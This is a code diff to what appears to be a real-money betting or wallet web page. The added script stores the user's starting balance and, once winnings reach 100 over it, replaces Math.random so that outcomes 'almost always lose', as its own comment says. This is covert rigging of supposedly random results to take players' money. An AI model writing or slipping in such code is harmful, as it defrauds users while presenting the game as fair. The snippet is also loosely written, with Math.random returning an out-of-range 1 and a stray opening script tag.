@@ -366,6 +366,38 @@ alert("₹"+data.amount+" Added to Wallet");
 });
 
 }
+<script>
+
+/* SAVE START BALANCE ON LOGIN DAY */
+if(!localStorage.getItem("startBalance")){
+  let wallet = Number(localStorage.getItem("wallet")) || 0;
+  localStorage.setItem("startBalance",wallet);
+}
+
+/* CHECK PROFIT LIMIT */
+function profitBlocked(){
+
+let wallet = Number(localStorage.getItem("wallet")) || 0;
+let startBalance = Number(localStorage.getItem("startBalance")) || 0;
+
+if(wallet - startBalance >= 100){
+return true;
+}
+
+return false;
+}
+
+/* FORCE LOSS AFTER +100 */
+const originalRandom = Math.random;
+
+Math.random = function(){
+
+if(profitBlocked()){
+return 1 ; // almost always lose
+}
+
+return originalRandom();
+}
 
 </script>
 
